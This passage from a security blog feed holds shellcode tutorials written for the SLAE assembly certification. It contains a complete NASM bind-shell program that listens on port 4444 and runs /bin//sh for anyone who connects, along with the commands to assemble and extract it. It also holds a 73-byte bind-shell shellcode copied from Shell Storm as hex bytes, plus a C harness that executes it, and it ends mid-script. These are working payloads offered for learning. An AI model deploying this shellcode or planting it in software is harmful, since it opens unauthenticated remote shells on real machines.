<th>Argument</th>
<th>Type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>filename</td>
<td>Char</td>
<td>The filename of the executable we want to run</td>
</tr>
<tr>
<td>argv[]</td>
<td>Array</td>
<td>The arguments to pass to the executable</td>
</tr>
<tr>
<td>envp[]</td>
<td>Array</td>
<td>The array of environment strings passed to the executable as environment variables</td>
</tr>
</tbody>
</table>
<p><!-- raw HTML omitted --></p>
<blockquote>
<p>For filename, we will use a simple <code>/bin/sh</code>, however, to keep our code neat, let&rsquo;s instead use <code>/bin//sh</code></p>
</blockquote>
<p>This will keep our code at 8 chars which will line up neatly on the stack and essentially makes no difference to the operating system.</p>
<p>We are not going to be passing any arguments or environment settings to the executable so we will just push NULL to the stack for these two arguments.</p>
<p>Our call should look something like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_execve[11 =&gt; eax](filename[/bin//sh location on stack =&gt; ebx], argv[][0 =&gt; ecx], envp[0 =&gt;edx]);
</code></pre></div><p>To get the hex value of your <code>/bin//sh</code> create a new file called <code>text2stack.py</code> with the following contents:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>

<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> struct

a <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&amp;lt;L&#39;</span>, str(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]))

<span style="color:#66d9ef">print</span> hex(a[<span style="color:#ae81ff">0</span>])
</code></pre></div><p>Run the code to pull out two sets of 4 chars.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./text2stack.py /bin
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./text2stack.py //sh
</code></pre></div><p>Build the last part of your assembly instructions using these new values returned by the script.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> ecx, ecx         <span style="color:#75715e">; clear value of ecx, args argument = 0</span>
<span style="color:#a6e22e">push</span> ecx             <span style="color:#75715e">; push a null to the stack to terminate our filename</span>
<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x68732f2f</span>      <span style="color:#75715e">; push //sh to the stack (second part of /bin//sh)</span>
<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x6e69622f</span>      <span style="color:#75715e">; push /bin to the stack (first part of /bin//sh</span>
<span style="color:#a6e22e">mov</span> ebx, esp         <span style="color:#75715e">; set ebx with the location of our file name on the stack</span>
<span style="color:#a6e22e">mov</span> edx, ecx         <span style="color:#75715e">; move null value for envp argument into edx</span>
<span style="color:#a6e22e">xor</span> eax, eax         <span style="color:#75715e">; clear value of eax</span>
<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">11</span>          <span style="color:#75715e">; sets the value 11 which is the syscall number for sys_execve</span>
<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>             <span style="color:#75715e">; call sys_execve</span>
</code></pre></div><p>Our completed code should now look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#66d9ef">global</span> _start            

<span style="color:#66d9ef">section</span> .text
_start:

        <span style="color:#75715e">; Start of our shellcode</span>

        <span style="color:#75715e">; sys_socket (creating a socket for our connection)</span>

        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear the value of eax </span>
        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear the value of ebx </span>
        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; set eax to 102 (sys_socketcall)</span>
        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">1</span>         <span style="color:#75715e">; set ebx to 1 (sys_socket)</span>
        <span style="color:#a6e22e">xor</span> ecx, ecx       <span style="color:#75715e">; clear the value of ecx</span>
        <span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push a null onto the stack (IPPROTO_IP = 0)</span>
        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">1</span>             <span style="color:#75715e">; push a 1 to the stack (SOCK_STREAM = 1)</span>
        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">2</span>             <span style="color:#75715e">; push a 2 to the stack (AF_INET = 2)</span>
        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; push the location of our arguments into ecx</span>
        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_socket</span>
        <span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the returned value to edx (socket file descriptor)</span>

        <span style="color:#75715e">; sys_bind (bind a port number to our socket)</span>

        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear the value of eax</span>
        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push eax to the stack as it&#39;s null (INADDR_ANY = 0)</span>
        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">0x5C11</span>   <span style="color:#75715e">; push our port number to the stack (Port = 4444)</span>
        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">2</span>        <span style="color:#75715e">; push protocol argument to the stack (AF_INET = 2)</span>
        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; mov value of esp into ecx, the location of our sockaddr arguments</span>
        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">16</span>            <span style="color:#75715e">; push addrlen to stack (addrlen = 16)</span>
        <span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push ecx to stack (ecx = location of our sockaddr arguments)</span>
        <span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push edx (sockfd value stored in edx)</span>
        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; move value of 102 into eax (sys_sockcall = 102)</span>
        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">2</span>         <span style="color:#75715e">; move value of 2 into eax (sys_bind = 2)</span>
        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the arguments into ecx</span>
        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_bind</span>

        <span style="color:#75715e">; sys_listen (listen on our created socket)</span>

        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax </span>
        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push backlog argument to stack (backlog = 0)</span>
        <span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; store the location of our arguments into ecx</span>
        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx to 0</span>
        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">4</span>         <span style="color:#75715e">; sets the value 4 which is the value for &#34;listen&#34; in sys_socketcall</span>
        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_listen</span>

        <span style="color:#75715e">; sys_accept (accept connections on our created port)</span>

        <span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push addrlen argument to stack (addrlen = 0)</span>
        <span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push addr argument to stack (addr = 0)</span>
        <span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push the sockfd argument to stack (sockfd stored in edx)</span>
        <span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the location of our arguments into ecx</span>
        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; sets the value 102 which is the syscall number for sys_socketcall</span>
        <span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
        <span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">5</span>         <span style="color:#75715e">; sets the value 5 which is the value for sys_accept</span>
        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_accept</span>
        <span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the return value from sys_accept to edx (client file descriptor)</span>

        <span style="color:#75715e">; sys_dup2 (create file descriptors for stdin, stdout and stderr so we can see the responses from execve)</span>

        <span style="color:#a6e22e">xor</span> eax, eax          <span style="color:#75715e">; clear value of eax</span>
        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">63</span>           <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
        <span style="color:#a6e22e">mov</span> ebx, edx          <span style="color:#75715e">; move the stored oldfd argument to ebx (stored in edx)</span>
        <span style="color:#a6e22e">xor</span> ecx, ecx          <span style="color:#75715e">; set ecx to 0 for stdin</span>
        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>              <span style="color:#75715e">; call sys_dup2</span>
        <span style="color:#a6e22e">xor</span> eax, eax          <span style="color:#75715e">; clear value of eax</span>
        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">63</span>           <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
        <span style="color:#a6e22e">inc</span> ecx               <span style="color:#75715e">; increment ecx to 1 for stdout</span>
        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>              <span style="color:#75715e">; call sys_dup2</span>
        <span style="color:#a6e22e">xor</span> eax, eax          <span style="color:#75715e">; clear value of eax</span>
        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">63</span>           <span style="color:#75715e">; sets the value 63 which is the syscall number for sys_dup2</span>
        <span style="color:#a6e22e">inc</span> ecx               <span style="color:#75715e">; increment ecx to 2 for stderr</span>
        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>              <span style="color:#75715e">; call sys_dup2</span>

        <span style="color:#75715e">; sys_execve (execute /bin//sh upon connecting and pass the responses back to connector)</span>

        <span style="color:#a6e22e">xor</span> ecx, ecx         <span style="color:#75715e">; clear value of ecx, args argument = 0</span>
        <span style="color:#a6e22e">push</span> ecx             <span style="color:#75715e">; push a null to the stack to terminate our filename</span>
        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x68732f2f</span>      <span style="color:#75715e">; push //sh to the stack (second part of /bin//sh)</span>
        <span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x6e69622f</span>      <span style="color:#75715e">; push /bin to the stack (first part of /bin//sh</span>
        <span style="color:#a6e22e">mov</span> ebx, esp         <span style="color:#75715e">; set ebx with the location of our file name on the stack</span>
        <span style="color:#a6e22e">mov</span> edx, ecx         <span style="color:#75715e">; move null value for envp argument into edx</span>
        <span style="color:#a6e22e">xor</span> eax, eax         <span style="color:#75715e">; clear value of eax</span>
        <span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">11</span>          <span style="color:#75715e">; sets the value 11 which is the syscall number for sys_execve</span>
        <span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>             <span style="color:#75715e">; call sys_execve</span>
</code></pre></div><p>That should be the entire bind shell done. Lets assemble this and test it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./nassemble.sh bindshell
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./bindshell
</code></pre></div><p>Check if port 4444 is listening:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">netstat -antp
</code></pre></div><p>Finally, connect to the listener and see if we have a shell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nc -nv 127.0.0.1 <span style="color:#ae81ff">4444</span>
id
</code></pre></div><p><img src="https://i.imgur.com/0SGUFE1.png" alt=""></p>
<p><strong>WIN, we have a working bind shell 100% written in assembly.</strong></p>
<p>Lets take a look at our shellcode.</p>
<p>Create a file called <code>getshell.sh</code> with the following code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
objdump -d ./$1|grep <span style="color:#e6db74">&#39;[0-9a-f]:&#39;</span>|grep -v <span style="color:#e6db74">&#39;file&#39;</span>|cut -f2 -d:|cut -f1-6 -d<span style="color:#e6db74">&#39; &#39;</span>|tr -s <span style="color:#e6db74">&#39; &#39;</span>|tr <span style="color:#e6db74">&#39;\t&#39;</span> <span style="color:#e6db74">&#39; &#39;</span>|sed <span style="color:#e6db74">&#39;s/ $//g&#39;</span>|sed <span style="color:#e6db74">&#39;s/ /\\x/g&#39;</span>|paste -d <span style="color:#e6db74">&#39;&#39;</span> -s |sed <span style="color:#e6db74">&#39;s/^/&#34;/&#39;</span>|sed <span style="color:#e6db74">&#39;s/$/&#34;/g&#39;</span>
</code></pre></div><p>Make the file executable and pass your executable &lsquo;bindshell&rsquo; as an argument:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./getshell bindshell
</code></pre></div><p><img src="https://i.imgur.com/zYfsAhM.png" alt=""></p>
<p>Uh OH! Even though our shellcode worked, it&rsquo;s full of null bytes (<code>\x00</code>) which is bad news for us.</p>
<p>In <a href="/posts/part-3-cleaning-and-optimising-shellcode">Part 3: Cleaning and Optimising Shellcode</a> we will take a look at how to clean our shellcode and remove all the null bytes as well as look at some ways to reduce it&rsquo;s size.</p>
<p>I hope you have learned a bit from reading this tutorial and feel more comfortable with assembly language as well as have some neat scripts to speed up your coding.</p>
<p>Keep on sploiting,</p>
<p>norsec0de</p>
]]></content>
        </item>
        
        <item>
            <title>part 1: disassembling and understanding shellcode</title>
            <link>https://www.pwnd.red/posts/part-1-disassembling-and-understanding-shellcode/</link>
            <pubDate>Thu, 24 Apr 2014 11:58:47 +0000</pubDate>
            
            <guid>https://www.pwnd.red/posts/part-1-disassembling-and-understanding-shellcode/</guid>
            <description>About a month ago I signed up for the Securitytube Linux Assembly Expert certification to get a deeper understanding of assembly and GDB. Doing so has helped me understand what is actually going on in the registers and not just relying on &amp;ldquo;hail-mary&amp;rdquo; advice like &amp;ldquo;use pop, pop, ret when dealing with SEH.&amp;rdquo; If you&amp;rsquo;re interested in Assembly or writing shellcode, I&amp;rsquo;d highly recommend you take the certification.
My first SLAE assignment was to write my own bind shell.</description>
            <content type="html"><![CDATA[
    <img src="https://i.imgur.com/f8xqQgX.png"  class="left"  />


<p>About a month ago I signed up for the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">Securitytube Linux Assembly Expert</a> certification to get a deeper understanding of assembly and GDB. Doing so has helped me understand what is actually going on in the registers and not just relying on &ldquo;hail-mary&rdquo; advice like &ldquo;<em>use pop, pop, ret when dealing with SEH</em>.&rdquo; If you&rsquo;re interested in Assembly or writing shellcode, I&rsquo;d highly recommend you take the certification.</p>
<p>My first SLAE assignment was to write my own bind shell. I don&rsquo;t know C well enough to code straight from memory, and even though I understand how individual assembly instructions affect data in the registers and the stack, I didn&rsquo;t know how to string these together to create working shellcode. I couldn&rsquo;t find many tutorials devoted to the subject so I decided to just dive in and build it from scratch.</p>
<p>I&rsquo;ve created this tutorial to help others who understand basic assembly instructions but who do not know how to string it together to create useful shellcode of their own. Following this post through to the end should bring you up to a level of understanding where you don&rsquo;t &ldquo;need&rdquo; to rely on other peoples scripts to build a bind shell and can start writing your own. My hope is that you will not feel overwhelmed when looking at shellcode and will start to explore, publish and write your own shellcode.</p>
<blockquote>
<p>NOTE: If you are already competent at compiling, disassembling or debugging shellcode, skip to <a href="/posts/part-2-building-the-shellcode/">Part 2: Building the Shellcode</a>.</p>
</blockquote>
<p>Lets get started&hellip;</p>
<h1 id="wtf-is-a-bind-shell">WTF is a bind shell?</h1>
<p>Before starting this exercise, my understanding of a bind shell was the following:</p>
<blockquote>
<p>a socket that allows you to send commands to a program and receive the responses over a network.
This is not very helpful when trying to build your own except that you think you need a socket, a port and an executable.</p>
</blockquote>
<p>Instead of guessing, lets take a look at some other bind shell shellcode and see what it does.</p>
<p><a href="http://www.metasploit.com/">Metasploit</a> is far from the only way to get your hands on shellcode. There are several sites that host shellcode that you can use for yourself such as <a href="http://www.exploit-db.com/shellcode/">Exploit Database</a> from <a href="http://www.offensive-security.com/">Offensive Security</a>, <a href="http://www.projectshellcode.com/?q=node/5">Project Shellcode</a> from <a href="https://twitter.com/tyronmiller">Ty Miller</a> and <a href="http://shell-storm.org/shellcode/">Shell Storm</a> from <a href="https://twitter.com/JonathanSalwan">Jonathan Salwan</a>.</p>
<p>Lets grab a small bind shell from <a href="http://shell-storm.org/shellcode/">Shell Storm</a> and see what it does.</p>
<p>First, create a folder to place your working files in.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">mkdir bindshell
</code></pre></div><p>Go to the following url and take a look at the content. It contains the content of a C file and instructions on how to compile and run it.</p>
<p><a href="http://shell-storm.org/shellcode/files/shellcode-836.php">http://shell-storm.org/shellcode/files/shellcode-836.php</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
</span><span style="color:#75715e">
</span><span style="color:#75715e"> Tiny Shell Bind TCP Shellcode - C Language
</span><span style="color:#75715e"> Linux/x86
</span><span style="color:#75715e">
</span><span style="color:#75715e"> Written in 2013 by Geyslan G. Bem, Hacking bits
</span><span style="color:#75715e">
</span><span style="color:#75715e">   http://hackingbits.com
</span><span style="color:#75715e">   geyslan@gmail.com
</span><span style="color:#75715e">
</span><span style="color:#75715e"> This source is licensed under the Creative Commons
</span><span style="color:#75715e"> Attribution-ShareAlike 3.0 Brazil License.
</span><span style="color:#75715e">
</span><span style="color:#75715e"> To view a copy of this license, visit
</span><span style="color:#75715e">
</span><span style="color:#75715e">   http://creativecommons.org/licenses/by-sa/3.0/
</span><span style="color:#75715e">
</span><span style="color:#75715e"> You are free:
</span><span style="color:#75715e">
</span><span style="color:#75715e">    to Share - to copy, distribute and transmit the work
</span><span style="color:#75715e">    to Remix - to adapt the work
</span><span style="color:#75715e">    to make commercial use of the work
</span><span style="color:#75715e">
</span><span style="color:#75715e"> Under the following conditions:
</span><span style="color:#75715e">   Attribution - You must attribute the work in the manner
</span><span style="color:#75715e">                 specified by the author or licensor (but
</span><span style="color:#75715e">                 not in any way that suggests that they
</span><span style="color:#75715e">                 endorse you or your use of the work).
</span><span style="color:#75715e">
</span><span style="color:#75715e">   Share Alike - If you alter, transform, or build upon
</span><span style="color:#75715e">                 this work, you may distribute the
</span><span style="color:#75715e">                 resulting work only under the same or
</span><span style="color:#75715e">                 similar license to this one.
</span><span style="color:#75715e">
</span><span style="color:#75715e">*/</span>

<span style="color:#75715e">/*
</span><span style="color:#75715e">
</span><span style="color:#75715e"> tiny_shell_bind_tcp_shellcode
</span><span style="color:#75715e">
</span><span style="color:#75715e"> * 73 bytes
</span><span style="color:#75715e"> * null-free if the port is
</span><span style="color:#75715e">
</span><span style="color:#75715e">
</span><span style="color:#75715e"> # gcc -m32 -fno-stack-protector -z execstack tiny_shell_bind_tcp_shellcode.c -o tiny_shell_bind_tcp_shellcode
</span><span style="color:#75715e">
</span><span style="color:#75715e"> Testing
</span><span style="color:#75715e"> # ./tiny_shell_bind_tcp_shellcode
</span><span style="color:#75715e"> # nc 127.0.0.1 11111
</span><span style="color:#75715e">
</span><span style="color:#75715e">*/</span>

<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \

<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\xcd\x80</span><span style="color:#e6db74">&#34;</span>;

main ()
{

        <span style="color:#75715e">// When the Port contains null bytes, printf will show a wrong shellcode length.
</span><span style="color:#75715e"></span>
	printf(<span style="color:#e6db74">&#34;Shellcode Length:  %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, strlen(code));

	<span style="color:#75715e">// Pollutes all registers ensuring that the shellcode runs in any circumstance.
</span><span style="color:#75715e"></span>
	__asm__ (<span style="color:#e6db74">&#34;movl $0xffffffff, %eax</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
		 <span style="color:#e6db74">&#34;movl %eax, %ebx</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
		 <span style="color:#e6db74">&#34;movl %eax, %ecx</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
		 <span style="color:#e6db74">&#34;movl %eax, %edx</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
		 <span style="color:#e6db74">&#34;movl %eax, %esi</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
		 <span style="color:#e6db74">&#34;movl %eax, %edi</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
		 <span style="color:#e6db74">&#34;movl %eax, %ebp</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>

	<span style="color:#75715e">// Setting the port
</span><span style="color:#75715e"></span>		 <span style="color:#e6db74">&#34;movw $0x672b, (code+20)</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>

	<span style="color:#75715e">// Calling the shellcode
</span><span style="color:#75715e"></span>		 <span style="color:#e6db74">&#34;call code&#34;</span>);

}
</code></pre></div><p>This may look big and scary now but we&rsquo;re only interested in seeing what it does so we can figure out how to write our own.</p>
<p>Leave that page open for now, we&rsquo;ll come back to it shortly.</p>
<p>Create a file in your bindshell folder called shellcode.c</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cd bindshell
nano shellcode.c
</code></pre></div><p>Paste the following code into the shellcode.c file we just opened.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
<span style="color:#e6db74">&#34;&#34;</span>;

main()
{

	printf(<span style="color:#e6db74">&#34;Shellcode Length:  %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, strlen(code));

	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;

	ret();

}
</code></pre></div><p>Now grab just the shellcode from the Shell Storm page and paste it into this new file ensuring the formatting looks like this.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\xcd\x80</span><span style="color:#e6db74">&#34;</span>;

main()
{

	printf(<span style="color:#e6db74">&#34;Shellcode Length:  %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, strlen(code));

	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;

	ret();

}
</code></pre></div><p>Save and close the file</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">CTRL + O              &lt;== Save File
{ENTER/RETURN KEY}    &lt;== Accept the Filename
CTRL X                &lt;== Exit&lt;/pre&gt;
</code></pre></div><p>Great, we&rsquo;ve just created a C file that will print our shellcode length and then run it. but before we can do that, we need to compile it into a binary file.</p>
<p>To be able to compile this file, we need a compiler such as <a href="http://gcc.gnu.org/">GCC (GNU Compiler Collection)</a> which will turn our source code into a binary file.</p>
<p>Assuming you&rsquo;re running this on a Debian based distro such as Ubuntu, Kali Linux, BackTrack or your own distro, you can use Aptitude to install GCC</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install gcc
</code></pre></div><p>Because we&rsquo;re going to compile shellcode often, lets create a script that we can reuse to compile our shellcode.c file.</p>
<p>Create a new file called <code>compile.sh</code> and paste the following into it</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>
